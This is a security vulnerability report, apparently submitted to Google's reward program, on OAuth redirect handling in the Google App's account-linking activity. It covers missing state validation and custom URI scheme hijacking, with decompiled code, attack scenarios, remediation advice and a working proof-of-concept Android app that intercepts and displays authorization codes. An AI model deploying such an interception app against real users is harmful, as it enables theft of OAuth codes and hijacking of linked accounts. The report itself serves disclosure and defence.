# VRP Report #40: Google App (AGSA) Account Linking OAuth Custom Scheme Interception

## Summary
Google App (com.google.android.googlequicksearchbox) contains an exported AccountLinkingActivity that handles OAuth redirects via the custom URI scheme `com.google.android.apps.gsa.gal://oauth2redirect`. The WebOAuth flow does NOT validate the `redirect_state` parameter against any stored expected value, enabling session fixation / CSRF attacks on account linking. Additionally, the custom scheme can be registered by any malicious app to intercept OAuth authorization codes.

## Affected Component
- **Package**: com.google.android.googlequicksearchbox (Google App / AGSA)
- **Class**: com.google.android.libraries.accountlinking.activity.AccountLinkingActivity
- **Also affected**: GeminiAccountLinkingActivity (subclass, enabled=false by default)
- **Library**: com.google.android.libraries.accountlinking (shared with YouTube — same root cause as VRP #38)

## Vulnerability Details

### 1. Missing State Validation in WebOAuth Flow

In `AccountLinkingActivity.onNewIntent()`, the WebOAuth flow (cxqm fragment) at lines 1293-1300:

```java
String queryParameter3 = data.getQueryParameter("redirect_state");
TextUtils.isEmpty(queryParameter3);
if (TextUtils.isEmpty(queryParameter3)) {
    cxpwVarA = cxqm.a;  // error - empty state
    cxqmVar.d.e(gatc.EVENT_APP_AUTH_NO_REDIRECT_STATE, null);
} else {
    cxpwVarA = cxpw.a(2, queryParameter3);  // SUCCESS - ANY non-empty value accepted
    cxqmVar.d.e(gatc.EVENT_APP_AUTH_SUCCESS, null);
}
```

The `redirect_state` is extracted from the incoming URI but **never compared against any expected value**. Any non-empty redirect_state is treated as successful authentication.

In contrast, the App Flip flow (cxpz fragment) at line 1337 **correctly validates** the state parameter:
```java
String queryParameter5 = data.getQueryParameter("state");
if (queryParameter5 == null || !queryParameter5.equals(cxpzVar.c) || ...) {
    // Error - state mismatch (cxpzVar.c = stored expected value)
```

### 2. Custom URI Scheme Hijacking

The redirect URI is `com.google.android.apps.gsa.gal://oauth2redirect`, declared in the manifest:
```xml
<activity android:exported="true" android:launchMode="singleInstance"
    android:name="com.google.android.libraries.accountlinking.activity.AccountLinkingActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="oauth2redirect"
              android:scheme="com.google.android.apps.gsa.gal"/>
    </intent-filter>
</activity>
```

Custom URI schemes (non-https) on Android are NOT exclusively owned — any app can register the same scheme in its manifest. When multiple apps claim the same scheme, Android shows a disambiguation dialog, giving the attacker's app a chance to receive the redirect containing the OAuth authorization code.

## Attack Scenario

### Scenario 1: OAuth Code Interception (Account Takeover of Third-Party Service)
1. Victim installs a malicious app that registers `com.google.android.apps.gsa.gal://oauth2redirect`
2. Victim uses Google Assistant to link a smart home service (e.g., "Link my Nest account")
3. The third-party OAuth flow redirects back to `com.google.android.apps.gsa.gal://oauth2redirect?redirect_state=STATE&code=AUTH_CODE`
4. Android shows disambiguation dialog → if victim picks wrong app, attacker gets the authorization code
5. Attacker uses the auth code to link the victim's third-party service to attacker's Google account

### Scenario 2: CSRF/Session Fixation (No User Interaction After Install)
1. Attacker crafts intent: `com.google.android.apps.gsa.gal://oauth2redirect?redirect_state=ATTACKER_CONTROLLED`
2. Since no state validation occurs, AGSA accepts this as a valid OAuth completion
3. Attacker can inject their own third-party service credentials, linking THEIR service account to the victim's Google account

## Impact
- **Severity**: HIGH
- **Confidentiality**: Authorization codes for third-party services can be intercepted
- **Integrity**: Account linking can be manipulated via session fixation
- **Scope**: Google App is pre-installed on ALL Android devices; account linking is used for Google Assistant smart home control, music services, productivity tools, etc.
- **User Interaction**: Installing malicious app (Scenario 1) or opening a crafted link (Scenario 2)
- **Permissions Required**: ZERO

## Root Cause
The `com.google.android.libraries.accountlinking` library's WebOAuth flow handler (`cxqm` fragment) does not implement CSRF protection via state parameter validation, while the App Flip flow (`cxpz` fragment) in the same library correctly implements it. This indicates an oversight in the WebOAuth code path.

## PoC

### PoC App Manifest (intent filter to intercept redirects)
```xml
<activity android:name=".AGSAOAuthInterceptActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="com.google.android.apps.gsa.gal"
              android:host="oauth2redirect"/>
    </intent-filter>
</activity>
```

### PoC Activity (AGSAOAuthInterceptActivity.java)
```java
package com.vrp.poc;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ScrollView;

public class AGSAOAuthInterceptActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(14);
        sv.addView(tv);
        setContentView(sv);

        StringBuilder sb = new StringBuilder();
        sb.append("=== VRP #40: AGSA OAuth Custom Scheme Interception ===\n\n");

        Uri data = getIntent().getData();
        if (data != null) {
            sb.append("INTERCEPTED OAuth redirect!\n\n");
            sb.append("Full URI: ").append(data.toString()).append("\n\n");
            sb.append("Scheme: ").append(data.getScheme()).append("\n");
            sb.append("Host: ").append(data.getHost()).append("\n\n");

            String redirectState = data.getQueryParameter("redirect_state");
            String code = data.getQueryParameter("code");
            String error = data.getQueryParameter("error");

            if (redirectState != null) {
                sb.append("STOLEN redirect_state: ").append(redirectState).append("\n");
            }
            if (code != null) {
                sb.append("STOLEN authorization code: ").append(code).append("\n");
            }
            if (error != null) {
                sb.append("Error: ").append(error).append("\n");
            }

            sb.append("\n=== IMPACT ===\n");
            sb.append("- OAuth authorization code for third-party service stolen\n");
            sb.append("- Can link attacker's account to victim's Google App\n");
            sb.append("- Affects Google Assistant smart home, music services, etc.\n");
            sb.append("- ZERO permissions required\n");
            sb.append("- redirect_state NOT validated by AccountLinkingActivity\n");
        } else {
            sb.append("No intent data received.\n");
            sb.append("Waiting for OAuth redirect to com.google.android.apps.gsa.gal://oauth2redirect\n");
        }

        tv.setText(sb.toString());
    }
}
```

## Verification
1. Static: Decompiled AccountLinkingActivity.java shows redirect_state accepted without validation (line 1293-1299)
2. Static: Manifest confirms exported=true with BROWSABLE intent filter on custom scheme
3. Static: App Flip flow in same activity correctly validates state (line 1337) — proving the omission is a bug
4. Dynamic: Install PoC app → trigger account linking in Google App → verify disambiguation dialog appears

## Remediation
1. Validate `redirect_state` against a stored expected value before accepting the OAuth result
2. Migrate from custom URI scheme to HTTPS App Links with domain verification (as already done for the Gemini variant)
3. Use PKCE (Proof Key for Code Exchange) for additional protection

## Relation to Other Findings
- Same root cause as VRP #38 (YouTube OAuth scheme interception) — shared library `com.google.android.libraries.accountlinking`
- Higher impact than YouTube due to Google App's broader scope (Assistant, smart home, all third-party service linking)

## Device Info
- Device: Pixel 6a (26131JEGR04733)
- Android: 17 (API 37)
- Build: CP2A.260605.012
- Google App version: as installed on device
